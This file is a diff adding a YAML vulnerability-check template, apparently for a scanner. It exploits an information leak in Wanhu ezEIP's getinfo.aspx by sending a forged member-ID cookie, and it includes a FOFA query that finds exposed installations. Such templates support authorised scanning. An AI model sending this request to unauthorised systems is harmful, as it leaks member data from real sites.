@@ -1,0 +1,18 @@
+id: poc-yaml-whir-ezeip-getinfo-aspx-info-leak
+info:
+  name: 万户 ezEIP getinfo.aspx 信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: 万户ezEIP
+  fofa: app="万户网络-ezEIP"
+requests:
+- method: GET
+  path: /label/member/getinfo.aspx
+  headers:
+    Cookie: WHIR_USERINFOR=whir_mem_member_pid=1
+  expression: "status_code == 200 && \nmatches(body,\"\\\"Key\\\":.*?\") &&\nmatches(body,\"\
+    \\\"Value\\\":.*?\") &&\ncontains(headers,\"ezEIP\") &&\n!contains(body,\"<\"\
+    )\n"
+variables: {}
+transport: http
